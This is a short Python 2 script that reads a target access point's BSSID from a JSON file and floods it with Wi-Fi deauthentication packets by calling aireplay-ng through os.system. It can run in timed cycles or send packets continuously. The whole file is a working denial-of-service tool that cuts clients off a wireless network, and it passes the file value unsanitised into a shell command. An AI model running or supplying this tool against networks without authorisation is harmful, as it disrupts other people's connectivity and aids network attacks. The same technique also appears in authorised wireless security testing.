#!/usr/bin/python
import json
import time
import os
import sys

def deauth_attack(AP_info, attack_type):
    target_bssid = str(AP_info['bssid'])
    print "[-] initiating deauth. . ."
    if attack_type == 1:
        print "[-] attack mode: attacks in multiple cycles with wait intervals in between"
        while True:
            print "[-] enter number of cycles\n[->] ",
            cycle    = int(raw_input())
            print "[-] enter number of intervals\n[->] ",
            interval = int(raw_input())
            if cycle>10 or cycle<=0 or interval >10:
                print "[ERROR] input not in range, enter again"
            else:
                break
        for __cycle in range(cycle):
            os.system('aireplay-ng --deauth 5  -a %s -D  wlan0mon' % (target_bssid))
            time.sleep(interval)
    elif attack_type ==2:
        print "[-] attack mode: continously send deauth packets"
        os.system('aireplay-ng --deauth 0  -a %s -D  wlan0mon' % (target_bssid))



if __name__ == "__main__":
    try:
        with open('ap_info_json/target_ap.json','r') as read_file:
            json_obj = json.load(read_file)
            if len(sys.argv)==1:
                sys.exit()
            else:
                deauth_attack(json_obj,int(sys.argv[1]))

    except Exception as e:
        print e
        print "[ERROR] something went wrong, can't locate target ap info."
        print os.system('ls ap_info_json/ -1q | wc -l')

